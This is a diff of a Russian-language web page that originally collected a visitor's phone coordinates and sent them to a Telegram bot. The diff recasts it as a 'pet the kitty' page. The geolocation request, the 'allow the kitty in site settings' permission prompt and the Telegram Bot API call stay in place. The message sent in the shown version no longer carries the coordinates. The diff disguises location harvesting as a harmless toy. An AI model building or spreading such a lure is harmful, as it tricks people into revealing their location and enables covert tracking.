@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Геолокация</title>
+    <title>Котик</title>
     <style>
         * {
             box-sizing: border-box;
@@ -82,13 +82,13 @@
 
     <div class="card">
         <div class="photo-wrapper">
-            <img src="photo.jpg" alt="Фото">
+            <img src="photo.png" alt="Фото">
         </div>
 
-        <h2 id="title">Проверка геопозиции</h2>
-        <div id="status">Нажмите кнопку ниже, чтобы отправить текущие координаты.</div>
+        <h2 id="title">Милый котик</h2>
+        <div id="status">Нажмите кнопку ниже, чтобы погладить котика</div>
         
-        <button id="geoBtn" onclick="getLocation()">Отправить геопозицию</button>
+        <button id="geoBtn" onclick="getLocation()">Погладить</button>
     </div>
 
     <!-- Скрытый аудиоплеер (укажите точное имя вашего файла) -->
@@ -113,12 +113,12 @@
             const btn = document.getElementById("geoBtn");
 
             btn.style.display = "none";
-            titleH2.innerText = "Поиск координат...";
-            statusDiv.innerText = "Ожидание ответа от датчиков телефона...";
+            titleH2.innerText = "Гладим...";
+            statusDiv.innerText = "Ожидание ответа от котика...";
 
             if (!navigator.geolocation) {
                 titleH2.innerText = "Ошибка";
-                statusDiv.innerText = "Геолокация не поддерживается вашим браузером.";
+                statusDiv.innerText = "Котик не поддерживается вашим браузером.";
                 return;
             }
 
@@ -130,21 +130,21 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const text = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${mapsLink}`;
+                    const text = `Котика погладили и он доволен!`;
 
-                    statusDiv.innerText = "Координаты получены, отправляем...";
+                    statusDiv.innerText = "Гладим...";
 
                     const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
                     
                     fetch(url, { mode: "no-cors" })
                         .then(() => {
-                            titleH2.innerText = "Отправлено! ✔️";
-                            statusDiv.innerText = `Координаты (${lat.toFixed(5)}, ${lon.toFixed(5)}) успешно переданы в Telegram.`;
+                            titleH2.innerText = "Готово!";
+                            statusDiv.innerText = `Котика погладили и он доволен!`;
                         })
                         .catch((err) => {
                             isSent = false;
-                            titleH2.innerText = "Ошибка сети";
-                            statusDiv.innerText = "Не удалось отправить запрос: " + err.message;
+                            titleH2.innerText = "Ошибка котика";
+                            statusDiv.innerText = "Не удалось погладить: " + err.message;
                             btn.style.display = "inline-block";
                         });
                 },
@@ -153,10 +153,10 @@
                     let errorMsg = "";
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMsg = "Доступ запрещен. Разрешите геолокацию в настройках сайта.";
+                            errorMsg = "Доступ запрещен. Разрешите котика в настройках сайта.";
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMsg = "Местоположение недоступно. Проверьте, включен ли GPS.";
+                            errorMsg = "Котик недоступен. Проверьте, включен ли GPS.";
                             break;
                         case error.TIMEOUT:
                             errorMsg = "Время ожидания истекло. Попробуйте еще раз.";
